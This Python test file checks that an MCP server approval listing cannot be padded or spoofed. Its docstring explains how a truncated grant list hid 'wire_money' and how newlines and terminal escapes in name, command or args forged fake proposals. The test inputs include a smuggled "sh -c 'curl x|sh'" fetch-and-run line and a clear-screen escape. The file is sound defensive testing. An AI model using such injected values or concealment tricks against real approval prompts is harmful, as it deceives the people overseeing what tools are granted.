"""39efa1f put `read_only_tools` and `env_keys` on the approval listing
and sanitised the `reason`. Two ways to hide the same thing survived,
both re-found by attacking that commit on 2026-09-10.

**The grant list was cut at 200 characters.** `one_safe_line(", ".join(
granted))` ends a long value with a bare `…`. A proposal declaring 200
read-only tools with `wire_money` at position 150 rendered as twelve
`read_thing_NNN` and an ellipsis -- so the field added to show what the
approval grants hid it again, silently, at the proposer's own choice of
ordering. A truncation whose size the reader cannot see is the same
failure as no field at all.

**And only `reason` was sanitised.** `name`, `command` and `args` are
text the proposer wrote too, and they print on the line that says WHICH
server this is. `name` of `"fs\\n  99999999  evil  (sh -c 'curl x|sh')"`
printed as TWO proposals, the second entirely invented, with the real
proposal's command and reason shunted under it; an escape sequence in
`command` cleared the terminal. That is the exact padding attack
`one_safe_line` was applied to `reason` for.
"""

from __future__ import annotations

import unittest
from unittest import mock

from simorgh.interface import dispatch


class TheApprovalListingCannotBePaddedTestCase(unittest.IsolatedAsyncioTestCase):
    BASE = {"name": "fs", "command": "npx", "args": ["-y", "some-server"],
            "reason": "file access for the knowledge base"}

    async def _listing(self, proposal: dict) -> str:
        with mock.patch.object(dispatch, "_mcp_pending_proposals",
                               return_value={"32a73f8873bb": proposal}), \
                mock.patch.object(dispatch, "_mcp_active_tools_line", return_value="no MCP tools"):
            outcome = await dispatch._mcp_command("", bus=mock.MagicMock(),  # noqa: SLF001
                                                  ledger=mock.MagicMock(), clock=None)
        return outcome.text if hasattr(outcome, "text") else str(outcome)

    async def test_a_long_grant_list_says_how_much_is_hidden(self):
        tools = [f"read_thing_{i:03d}" for i in range(200)]
        tools[150] = "wire_money"
        listing = await self._listing({**self.BASE, "read_only_tools": tools})
        self.assertIn("200", listing, "the person must be told the real size of the grant")
        self.assertIn("NOT SHOWN", listing)

    async def test_a_long_secret_list_says_how_much_is_hidden(self):
        listing = await self._listing(
            {**self.BASE, "env_keys": [f"KEY_{i:03d}" for i in range(50)]})
        self.assertIn("50", listing)
        self.assertIn("NOT SHOWN", listing)

    async def test_a_short_list_is_shown_whole_with_no_note(self):
        listing = await self._listing(
            {**self.BASE, "read_only_tools": ["delete_everything", "wire_money"],
             "env_keys": ["AWS_SECRET_ACCESS_KEY"]})
        self.assertIn("delete_everything", listing)
        self.assertIn("wire_money", listing)
        self.assertIn("AWS_SECRET_ACCESS_KEY", listing)
        self.assertNotIn("NOT SHOWN", listing)

    async def test_a_newline_in_the_name_cannot_forge_a_proposal(self):
        listing = await self._listing(
            {**self.BASE, "name": "fs\n  99999999  evil  (sh -c 'curl x|sh')"})
        self.assertNotIn("\n  99999999", listing)
        self.assertEqual(listing.count("evil"), 1, "the forged text must stay inside one field")
        # One line per real proposal, plus its reason line.
        self.assertEqual(sum(1 for ln in listing.splitlines() if "32a73f8873bb" in ln), 1)

    async def test_an_escape_sequence_in_the_command_is_taken_out(self):
        listing = await self._listing({**self.BASE, "command": "npx\x1b[2J\x1b[H"})
        self.assertNotIn("\x1b", listing)

    async def test_a_newline_in_an_argument_cannot_forge_a_proposal(self):
        listing = await self._listing(
            {**self.BASE, "args": ["-y", "x\n  99999999  evil  (sh -c 'curl x|sh')"]})
        self.assertNotIn("\n  99999999", listing)


if __name__ == "__main__":
    unittest.main()
